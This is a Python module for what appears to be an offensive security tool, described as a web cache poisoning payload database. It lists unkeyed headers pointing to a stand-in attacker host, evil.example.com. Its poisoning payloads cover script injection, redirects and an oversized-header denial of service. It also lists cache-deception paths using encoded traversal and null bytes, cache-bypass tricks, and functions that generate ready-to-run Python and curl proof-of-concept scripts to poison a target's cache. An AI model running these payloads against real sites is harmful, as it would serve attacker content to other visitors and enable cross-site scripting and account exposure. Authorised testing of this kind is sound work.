"""
Web Cache Poisoning Payload Database
Project #34: Web Cache Poisoning & Deception
"""

CACHE_HEADERS = [
    'X-Cache', 'X-Cache-Status', 'CF-Cache-Status', 'CF-RAY',
    'Age', 'Cache-Control', 'Pragma', 'Expires',
    'X-Served-By', 'X-Varnish', 'X-Cache-Hits', 'X-Fastly-Request-ID',
    'X-Served-By-Cache', 'X-Proxy-Cache', 'X-Akamai-Cache',
]

CACHE_HIT_VALUES = ['HIT', 'hit', 'Hit', 'MISS', 'MISS', 'EXPIRED']

UNKEYED_HEADERS = {
    'X-Forwarded-Host':  'evil.example.com',
    'X-Forwarded-For':   '1.2.3.4',
    'X-Forwarded-Scheme':'http',
    'X-Forwarded-Proto': 'http',
    'X-Host':            'evil.example.com',
    'X-Original-URL':    '/admin',
    'X-Rewrite-URL':     '/admin',
    'X-HTTP-Method-Override': 'POST',
    'X-Original-Host':   'evil.example.com',
    'X-Backend-Host':    'evil.example.com',
    'Forwarded':         'host=evil.example.com',
    'X-Forwarded-Port':  '8443',
}

POISON_PAYLOADS = {
    'xss_injection': {
        'headers': {'X-Forwarded-Host': 'evil.example.com'},
        'desc': 'Inject XSS via X-Forwarded-Host',
        'target_reflection': True,
    },
    'redirect_poison': {
        'headers': {'X-Forwarded-Host': 'evil.example.com'},
        'desc': 'Poison redirect to attacker host',
        'target_reflection': True,
    },
    'script_src_poison': {
        'headers': {'X-Forwarded-Host': 'evil.example.com'},
        'desc': 'Poison <script src> URL',
        'target_reflection': True,
    },
    'link_href_poison': {
        'headers': {'X-Forwarded-Host': 'evil.example.com'},
        'desc': 'Poison <link href>',
        'target_reflection': True,
    },
    'dos_fat_header': {
        'headers': {'X-Forwarded-Host': 'A' * 4000},
        'desc': 'DoS via oversized header',
        'target_reflection': False,
    },
    'cache_key_confusion': {
        'headers': {'X-Forwarded-Host': 'evil.example.com'},
        'desc': 'Confuse cache key with header',
        'target_reflection': False,
    },
}

DECEPTION_PATHS = [
    '/api/user/1/..%2f..%2fstatic/style.css',
    '/api/user/1.css',
    '/api/user/1;.css',
    '/api/user/1%20.css',
    '/api/user/1/.css',
    '/api/user/1.js',
    '/api/user/1.png',
    '/api/user/1/..;/static/',
    '/api/user/1?foo=.css',
    '/api/user/1%00.css',
]


def bypass_techniques(base_url):
    return [
        ('random_param',  f"{base_url}?cb=12345",   {}),
        ('random_param2', f"{base_url}?nocache=1",  {}),
        ('cache_header',  base_url,                 {'Cache-Control': 'no-cache'}),
        ('pragma_header', base_url,                 {'Pragma': 'no-cache'}),
        ('method_post',   base_url,                 {'X-HTTP-Method-Override': 'POST'}),
        ('encoding',      f"{base_url}%2f",         {}),
        ('double_slash',  f"{base_url}//",           {}),
        ('dot_slash',     f"{base_url}/./",          {}),
        ('semicolon',     f"{base_url};foo=bar",    {}),
        ('http10',        base_url,                 {}),
    ]


REFLECTION_SIGNATURES = {
    'plain_reflection':   r'evil\.example\.com',
    'script_src':         r'<script[^>]+src=["\']https?://evil\.example\.com',
    'link_href':          r'<link[^>]+href=["\']https?://evil\.example\.com',
    'anchor_href':        r'<a[^>]+href=["\']https?://evil\.example\.com',
    'redirect_location':  r'Location:\s*https?://evil\.example\.com',
    'canonical_url':      r'<link[^>]+rel=["\']canonical["\'][^>]+evil\.example\.com',
    'og_url':             r'<meta[^>]+property=["\']og:url["\'][^>]+evil\.example\.com',
}


def python_poc(target_url, headers, description):
    hdr_lines = '\n'.join(f'    "{k}": "{v}",' for k, v in headers.items())
    return '''#!/usr/bin/env python3
"""PoC: %s - Auto-generated"""
import requests

URL = "%s"
HEADERS = {
%s
}

r = requests.get(URL, headers=HEADERS, timeout=10)
print("Poison response:", r.status_code)

r2 = requests.get(URL, timeout=10)
print("")
print("Clean request response:")
print(f"  Status: {r2.status_code}")
if "evil.example.com" in r2.text:
    print("[!] CACHE POISONED")
else:
    print("[+] Cache not poisoned")
''' % (description, target_url, hdr_lines)


def curl_poc(target_url, headers, description):
    hdr_args = ' '.join(f'-H "{k}: {v}"' for k, v in headers.items())
    return '''#!/bin/bash
# PoC: %s
echo "[*] Step 1: Poison cache"
curl -s -o /dev/null -w "%%{http_code}\\n" %s "%s"
echo ""
echo "[*] Step 2: Normal request (should show poisoned content)"
curl -s "%s"
echo ""
''' % (description, hdr_args, target_url, target_url)


def score_finding(kind):
    scores = {
        'xss_injection':         'CRITICAL',
        'redirect_poison':       'HIGH',
        'script_src_poison':     'CRITICAL',
        'link_href_poison':      'HIGH',
        'dos_fat_header':        'MEDIUM',
        'cache_key_confusion':   'MEDIUM',
        'cache_deception':       'HIGH',
        'cache_bypass':          'LOW',
    }
    return scores.get(kind, 'MEDIUM')
